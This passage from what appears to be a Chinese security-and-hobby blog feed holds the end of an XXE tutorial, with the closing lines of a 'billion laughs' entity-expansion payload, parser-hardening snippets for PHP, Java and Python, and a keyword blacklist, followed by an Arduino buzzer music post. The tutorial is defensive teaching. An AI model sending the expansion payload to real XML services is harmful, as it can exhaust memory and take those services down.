class="meta">&lt;!ENTITY <span class="meta-keyword">lol5</span> <span class="meta-string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol6</span> <span class="meta-string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol7</span> <span class="meta-string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol8</span> <span class="meta-string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="meta-keyword">lol9</span> <span class="meta-string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">     ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">lolz</span>&gt;</span>&amp;lol9;<span class="tag">&lt;/<span class="name">lolz</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="XXEé˜²å¾¡"><a href="#XXEé˜²å¾¡" class="headerlink" title="XXEé˜²å¾¡"></a>XXEé˜²å¾¡</h1><ol><li><p>ç¦ç”¨å¤–éƒ¨å®ä½“åº”ç”¨ </p><p>PHP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>JAVA</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>,<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>,<span class="keyword">false</span>)</span><br><span class="line"></span><br><span class="line">.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>Python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure></li><li><p>é»‘åå•è¿‡æ»¤</p></li></ol><p>å»ºç«‹é»‘åå•ï¼Œå¦‚&lt;ã€DOCTYPEã€ENTITYã€SYSTEMã€PUBLICç­‰å­—ç¬¦ï¼Œè¿‡æ»¤æ‰ç”¨æˆ·è¾“å…¥çš„æ•æ„Ÿè¯ã€‚</p><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://xz.aliyun.com/t/3357#toc-11">ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´</a></p><p>[2] <a href="https://mature-sec.com/post/xxe%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#xxe%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">XXEæ¼æ´å­¦ä¹ </a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨å­¦ä¹  </tag>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arduinoè‡´å¬ä½“éªŒ</title>
      <link href="posts/64177.html"/>
      <url>posts/64177.html</url>
      
        <content type="html"><![CDATA[<div class="note red icon simple"><i class="note-icon fas fa-bullhorn"></i><p>ä¸Šæ¬¡Arduinoå°è½¦æ— æœè€Œç»ˆä¹‹åï¼Œå†³å®šæ•´ç‚¹å¥½ç©çš„ã€‚æ²¡é”™ï¼Œå®ƒæ¥äº†ï¼Œå®ƒæ¥äº†ï¼Œèœ‚é¸£å™¨å¸¦ç€å®ƒ<del>å¥½å¬</del>çš„éŸ³ä¹èµ°æ¥äº†ã€‚</p></div><h1 id="æ‰€ç”¨ææ–™"><a href="#æ‰€ç”¨ææ–™" class="headerlink" title="æ‰€ç”¨ææ–™"></a>æ‰€ç”¨ææ–™</h1><ol><li>Adruino unoä¸€å—</li><li>é¢åŒ…æ¿ä¸€ä¸ª</li><li>æ— æºèœ‚é¸£å™¨ä¸€ä¸ª</li><li>æœé‚¦çº¿è‹¥å¹²</li></ol><h1 id="ç¡¬ä»¶æ¥çº¿"><a href="#ç¡¬ä»¶æ¥çº¿" class="headerlink" title="ç¡¬ä»¶æ¥çº¿"></a>ç¡¬ä»¶æ¥çº¿</h1><table><thead><tr><th align="center">arduino</th><th align="center">èœ‚é¸£å™¨</th></tr></thead><tbody><tr><td align="center">5V</td><td align="center">VCC</td></tr><tr><td align="center">GND</td><td align="center">GND</td></tr><tr><td align="center">8</td><td align="center">I/O</td></tr></tbody></table><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210403160903354.png" alt="image-20210403160903354"></p><h1 id="å‘å‡ºå£°éŸ³"><a href="#å‘å‡ºå£°éŸ³" class="headerlink" title="å‘å‡ºå£°éŸ³"></a>å‘å‡ºå£°éŸ³</h1><p>å‰é¢æˆ‘ä»¬å·²ç»æŠŠæ•°å­—IOè¿æ¥åˆ°äº†èœ‚é¸£å™¨çš„æ­£æï¼Œè®©èœ‚é¸£å™¨å“èµ·æ¥åªéœ€è¦åœ¨æ•°å­—IOä¸Šæ”¾å…¥æ–¹æ³¢å³å¯ã€‚</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">digitalWrite</span>(buzzerPin,<span class="literal">HIGH</span>); <span class="comment">//é«˜ç”µå¹³</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">digitalWrite</span>(buzzerPin,<span class="literal">LOW</span>);  <span class="comment">//ä½ç”µå¹³</span></span><br><span class="line"><span class="built_in">delay</span>(<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>å…¶ä¸­çš„100æŒ‡çš„æ˜¯å‘å£°åå»¶æ—¶100ms</p><h1 id="å”±å‡ºæ—‹å¾‹"><a href="#å”±å‡ºæ—‹å¾‹" class="headerlink" title="å”±å‡ºæ—‹å¾‹"></a>å”±å‡ºæ—‹å¾‹</h1><p>å¦‚æœåªæ˜¯å‘å‡ºå“å£°çš„è¯ï¼Œé‚£ä¹Ÿå¤ªé¸¡è‚‹äº†å§ï¼Ÿå¦‚æœè¦å‘å‡ºç²¾ç¡®çš„ä¸åŒé¢‘ç‡çš„ä¹éŸ³æ€ä¹ˆåŠï¼Ÿéš¾é“è¿˜è¦ç®—ï¼Ÿï¼ˆä¸‹é¢æ˜¯ä¸€å¼ ä¹éŸ³é¢‘ç‡å›¾ï¼‰</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwMTA3MjE1ODQ2NzU5" alt="éŸ³ç¬¦è¡¨"></p><p>ç®—æ˜¯ä¸å¯èƒ½å•¦ï¼Œè¿™é‡Œç›´æ¥æŠŠå¤§ä½¬ä»¬â€œç¿»è¯‘â€å¥½çš„ä»£ç æ¬äº†è¿‡æ¥ï¼Œæ„Ÿè°¢åˆ†äº«ï¼ä¸‹é¢ä¸‰é¦–â€œæ­Œæ›²â€å¯ä»¥è¯•ç€å¬ä¸€ä¸‹~</p><div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">è‘«èŠ¦å¨ƒ</button></li><li class="tab"><button type="button" data-href="#-2">åƒæœ¬æ¨±</button></li><li class="tab"><button type="button" data-href="#-3">çˆ±æ‹¼æ‰ä¼šèµ¢</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><audio controls="" preload="" __idm_id__="269361153">  <source    src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/%E8%91%AB%E8%8A%A6%E5%A8%83.mp3"    type="audio/mp3"  />  Your browser does not support the audio tag.</audio><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D0 -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D1 294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D2 330</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D3 350</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D4 393</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D5 441</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D6 495</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_D7 556</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL1 147</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL2 165</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL3 175</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL4 196</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL5 221</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL6 248</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DL7 278</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH1 589</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH2 661</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH3 700</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH4 786</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH5 882</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH6 990</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_DH7 112</span></span><br><span class="line"><span class="comment">//ä»¥ä¸Šéƒ¨åˆ†æ˜¯å®šä¹‰æ˜¯æŠŠæ¯ä¸ªéŸ³ç¬¦å’Œé¢‘ç‡å€¼å¯¹åº”èµ·æ¥ï¼Œå…¶å®ä¸ç”¨æ‰“è¿™ä¹ˆå¤šï¼Œä½†æ˜¯éƒ½æ‰“ä¸Šäº†ï¼Œåé¢å¯ä»¥éšæ„ç¼–å†™Dè°ƒçš„å„ç§æ­Œï¼Œæˆ‘è¿™é‡Œç”¨NOTE_D+æ•°å­—è¡¨ç¤ºéŸ³ç¬¦ï¼ŒNOTE_DH+æ•°å­—è¡¨ç¤ºä¸Šé¢æœ‰ç‚¹çš„é‚£ç§éŸ³ç¬¦ï¼ŒNOTE_DL+æ•°å­—è¡¨ç¤ºä¸‹é¢æœ‰ç‚¹çš„é‚£ç§éŸ³ç¬¦ã€‚è¿™æ ·åé¢å†™èµ·æ¥æ¯”è¾ƒå¥½è¯†åˆ«ã€‚</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WHOLE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HALF 0.5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUARTER 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EIGHTH 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIXTEENTH 0.625</span></span><br><span class="line"><span class="comment">//è¿™éƒ¨åˆ†æ˜¯ç”¨è‹±æ–‡å¯¹åº”äº†æ‹å­ï¼Œè¿™æ ·åé¢ä¹Ÿæ¯”è¾ƒå¥½çœ‹</span></span><br><span class="line"><span class="keyword">int</span> tune[] =</span><br><span class="line">&#123;</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D5,NOTE_D6,NOTE_D0,</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D5,NOTE_DH1,NOTE_D6,NOTE_D0,NOTE_D6,</span><br><span class="line">  NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D6,NOTE_D0,NOTE_D6,</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D5,NOTE_DH1,NOTE_D6,NOTE_D0,</span><br><span class="line">  </span><br><span class="line">  NOTE_D1,NOTE_D1,NOTE_D3,</span><br><span class="line">  NOTE_D1,NOTE_D1,NOTE_D3,NOTE_D0,</span><br><span class="line">  NOTE_D6,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D6,</span><br><span class="line">  NOTE_D5,NOTE_D1,NOTE_D3,NOTE_D0,</span><br><span class="line">  NOTE_DH1,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D6,</span><br><span class="line">  NOTE_D5,NOTE_D1,NOTE_D2,NOTE_D0,</span><br><span class="line">  NOTE_D7,NOTE_D7,NOTE_D5,NOTE_D3,</span><br><span class="line">  NOTE_D5,</span><br><span class="line">  NOTE_DH1,NOTE_D0,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_D0,NOTE_D5,NOTE_D1,NOTE_D3,NOTE_D0,</span><br><span class="line">  NOTE_DH1,NOTE_D0,NOTE_D6,NOTE_D6,NOTE_D5,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_D0,NOTE_D5,NOTE_D1,NOTE_D2,NOTE_D0,</span><br><span class="line">  NOTE_D3,NOTE_D3,NOTE_D1,NOTE_DL6,</span><br><span class="line">  NOTE_D1,</span><br><span class="line">  NOTE_D3,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_D3,NOTE_D5,NOTE_D6,NOTE_D6,</span><br><span class="line">  NOTE_DH1,NOTE_D0,NOTE_D7,NOTE_D5,</span><br><span class="line">  NOTE_D6,</span><br><span class="line">&#125;;<span class="comment">//è¿™éƒ¨åˆ†å°±æ˜¯æ•´é¦–æ›²å­çš„éŸ³ç¬¦éƒ¨åˆ†ï¼Œç”¨äº†ä¸€ä¸ªåºåˆ—å®šä¹‰ä¸ºtuneï¼Œæ•´æ•°</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">float</span> duration[]=</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  </span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>+<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,<span class="number">0.5</span>+<span class="number">0.25</span>,<span class="number">0.25</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">0.5</span>,<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">1</span>+<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>,<span class="number">0.5</span>,<span class="number">0.5</span>,<span class="number">1</span>,</span><br><span class="line">  <span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span></span><br><span class="line">&#125;;<span class="comment">//è¿™éƒ¨åˆ†æ˜¯æ•´é¦–æ›²å­çš„æ¥æ‹éƒ¨åˆ†ï¼Œä¹Ÿå®šä¹‰ä¸ªåºåˆ—durationï¼Œæµ®ç‚¹ï¼ˆæ•°ç»„çš„ä¸ªæ•°å’Œå‰é¢éŸ³ç¬¦çš„ä¸ªæ•°æ˜¯ä¸€æ ·çš„ï¼Œä¸€ä¸€å¯¹åº”ä¹ˆï¼‰</span></span><br><span class="line"><span class="keyword">int</span> length;<span class="comment">//è¿™é‡Œå®šä¹‰ä¸€ä¸ªå˜é‡ï¼Œåé¢ç”¨æ¥è¡¨ç¤ºå…±æœ‰å¤šå°‘ä¸ªéŸ³ç¬¦</span></span><br><span class="line"><span class="keyword">int</span> tonePin=<span class="number">8</span>;<span class="comment">//èœ‚é¸£å™¨çš„pin</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">pinMode</span>(tonePin,<span class="literal">OUTPUT</span>);<span class="comment">//è®¾ç½®èœ‚é¸£å™¨çš„pinä¸ºè¾“å‡ºæ¨¡å¼</span></span><br><span class="line">  length = <span class="keyword">sizeof</span>(tune)/<span class="keyword">sizeof</span>(tune[<span class="number">0</span>]);<span class="comment">//è¿™é‡Œç”¨äº†ä¸€ä¸ªsizeofå‡½æ•°ï¼Œå¯ä»¥æŸ¥å‡ºtoneåºåˆ—é‡Œæœ‰å¤šå°‘ä¸ªéŸ³ç¬¦</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>;x&lt;length;x++)<span class="comment">//å¾ªç¯éŸ³ç¬¦çš„æ¬¡æ•°</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">tone</span>(tonePin,tune[x]);<span class="comment">//æ­¤å‡½æ•°ä¾æ¬¡æ’­æ”¾tuneåºåˆ—é‡Œçš„æ•°ç»„ï¼Œå³æ¯ä¸ªéŸ³ç¬¦</span></span><br><span class="line">    <span class="built_in">delay</span>(<span class="number">400</span>*duration[x]);<span class="comment">//æ¯ä¸ªéŸ³ç¬¦æŒç»­çš„æ—¶é—´ï¼Œå³èŠ‚æ‹durationï¼Œ400æ˜¯è°ƒæ•´æ—¶é—´çš„è¶Šå¤§ï¼Œæ›²å­é€Ÿåº¦è¶Šæ…¢ï¼Œè¶Šå°æ›²å­é€Ÿåº¦è¶Šå¿«ï¼Œè‡ªå·±æŒæ¡å§</span></span><br><span class="line">    <span class="built_in">noTone</span>(tonePin);<span class="comment">//åœæ­¢å½“å‰éŸ³ç¬¦ï¼Œè¿›å…¥ä¸‹ä¸€éŸ³ç¬¦</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">5000</span>);<span class="comment">//ç­‰å¾…5ç§’åï¼Œå¾ªç¯é‡æ–°å¼€å§‹</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><audio controls="" preload="" __idm_id__="269361153">  <source    src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/%E5%8D%83%E6%9C%AC%E6%A8%B1.mp3"    type="audio/mp3"  />  Your browser does not support the audio tag.</audio><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A0 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A1 441</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A2 495</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A3 556</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A4 589</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A5 661</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> A6 742</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL1 221</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL2 248</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL3 278</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL4 294</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL5 330</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL6 371</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AL7 416</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH1 882</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH2 990</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH3 1112</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH4 1178</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH5 1322</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH6 1484</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> AH7 1665</span></span><br><span class="line"><span class="comment">/******************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/********** è¿™éƒ¨åˆ†æ˜¯ç”¨è‹±æ–‡å¯¹åº”äº†æ‹å­ **********/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WHOLE 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HALF 0.5</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUARTER 0.25</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EIGHTH 0.25</span></span><br><span class="line"><span class="meta">#<span 